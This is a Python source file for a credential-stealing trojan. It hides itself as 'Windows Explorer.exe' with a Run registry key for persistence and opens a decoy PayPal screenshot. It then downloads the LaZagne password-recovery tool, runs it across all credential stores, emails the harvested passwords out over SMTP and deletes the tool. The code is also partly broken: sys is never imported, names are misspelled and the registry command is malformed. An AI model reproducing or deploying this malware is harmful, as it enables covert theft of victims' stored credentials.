import requests
import subprocess
import smtplib
import os
import tempfile
import shutil

# Adds Download.exe to windows reg editor for persisitenece
def become_persistent():
    Malocation = os.environ["appdata"] + "\\Windows Explorer.exe"
    if not os.path.exists(Malocation):
        shutil.copyfile(sys.exexutable, Malocation)
        subprocess.call("reg add HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\run /v Explorer /t REG_SZ /d Exexutables/Download.exe" + Malocation, shell=True)

file_name = sys._MEIPASS + "\paypalSS.png"
subprocess.Popen(file_name, shell=True)

def Download(url):
    GetResponse = requests.get(url)
    filename = url.split("/") [-1]

    with open(filename, "wb") as out_file:
        out_file.write(GetResponse.content)

    print(GetResponse)

def SendMail(email, password, message):

    server = smtplib.SMTP("smtp.office365.com", 587)
    server.starttls()
    server.login(email, password)
    server.sendmail(email, email, message)
    server.quit()

temp_directory = tempfile.gettempdir() # Get's temp directory to place lazagne.exe in
os.chdir(temp_directory)

Download("http://github.com//AlessandroZ/LaZagne/releases/download/2.4.3/lazagne.exe")

# Runs lazagne.exe on all search types for credential harvesting
result = subprocess.check_output("lazagne.exe all", shell=True);
print(result)

SendMail("", "", result)
os.remove("lazagne.exe")
